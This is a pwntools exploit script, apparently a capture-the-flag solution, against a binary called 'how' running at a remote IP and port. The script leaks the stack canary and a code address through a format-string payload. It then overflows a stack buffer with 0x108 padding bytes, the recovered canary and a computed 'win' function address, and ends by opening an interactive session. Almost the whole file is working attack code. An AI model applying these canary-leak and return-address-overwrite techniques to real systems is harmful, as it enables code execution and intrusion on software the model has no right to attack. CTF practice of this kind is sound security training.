#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 13.214.13.126 --port 37013 ./how
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./how')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '13.214.13.126'
port = int(args.PORT or 37013)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x0000555555555220
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

win = 0xde

p ='.'*40
p +='Q'
p += '-%47$p'
io.sendlineafter("? ",p)

leak = io.recvline()[:-1].split('-')
canary = int(leak[1],16)
print hex(canary)
io.recvuntil("address ")
leak = int(io.recvline()[:-1],16)
win = leak + win
print hex(win)

p ='a'*(0x108)
p += p64(canary)
p += p64(0)
p += p64(win)
io.sendlineafter(">> ",p)

io.interactive()

